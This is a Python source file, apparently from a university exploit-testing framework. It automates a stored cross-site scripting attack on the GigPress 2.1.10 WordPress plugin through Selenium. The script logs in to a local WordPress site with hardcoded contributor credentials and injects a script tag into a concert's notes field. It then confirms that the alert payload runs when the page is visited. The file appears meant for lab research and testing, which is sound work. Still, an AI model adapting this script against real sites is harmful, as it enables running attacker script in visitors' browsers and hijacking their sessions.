
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import time
import urllib
import urllib2
import cookielib

from selenium.common.exceptions import NoAlertPresentException

import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "OSVDB_71163",
                  'Description' : "GigPress Plugin for WordPress contains a flaw that "
                                  "allows a remote cross-site scripting (XSS) attack. "
                                  "This flaw exists because the application does not "
                                  "input passed via the 'Notes' field before returning "
                                  "it to the user. This may allow a user to create a "
                                  "specially crafted URL that would execute arbitrary "
                                  "script code in a user's browser within the trust "
                                  "relationship between their browser and the server.",
                  'References' :  [['OSVDB', '71163'],
                                   ['EDB', '16232']],
                  'Target' :      "Wordpress 3.2", 
                  'TargetLicense' : '',
                  'Plugin':       "GigPress 2.1.10",
                  'Type' : 'XSS'
                  }


    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
            
    def exploit(self):
        driver = self.create_selenium_driver()

        self.logger.info("Logging in as contributor")
        driver.delete_all_cookies()
        driver.get("http://localhost/wordpress/wp-login.php")
        driver.get_element(by_id="user_login").send_keys("contributor")
        driver.get_element(by_id="user_pass").send_keys("contributor21")
        driver.get_element(by_id="wp-submit").click()
        driver.get_element(by_xpath="//a[@href='admin.php?page=gigpress/gigpress.php']").click()
 
        sel = driver.get_element(by_xpath="//select[@id='gp_yy']")
        for option in sel.find_elements_by_tag_name('option'):
            if option.text == '2050':
                print "Selecting Date"
                option.click()
         
        sel = driver.get_element(by_xpath="//select[@id='show_artist_id']")
        for option in sel.find_elements_by_tag_name('option'):
            if option.text == 'Add a new artist':
                print "Adding artist"
                option.click()
        driver.get_element(by_xpath="//input[@id='artist_name']").send_keys("The Haxors")
        sel = driver.get_element(by_xpath="//select[@id='show_venue_id']")
        for option in sel.find_elements_by_tag_name('option'):
            if option.text == 'Add a new venue':
                print "Adding a venue"
                option.click()
        driver.get_element(by_xpath="//input[@id='venue_name']").send_keys("UMD")
        driver.get_element(by_xpath="//input[@id='venue_city']").send_keys("College Park")
        driver.get_element(by_xpath="//textarea[@id='show_notes']").send_keys("<script>alert('w00t');</script>")
        driver.get_element(by_xpath="//input[@name='Submit']").click()
        driver.get_element(by_xpath="//div[@id='message']/p[contains(text(),'successfully added')]", attempts=6, delay=4)

        driver.cleanup()
        return

    def verify(self):
        verified = False

        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/wordpress")
        driver.get_element(by_link_text="Exploit Concert").click()
    
        try:
            driver.get_alert()
            self.logger.info("XSS popup comfirmed")
            verified = True
        except NoAlertPresentException:
            self.logger.error("XSS failed")

        driver.cleanup()
        return verified
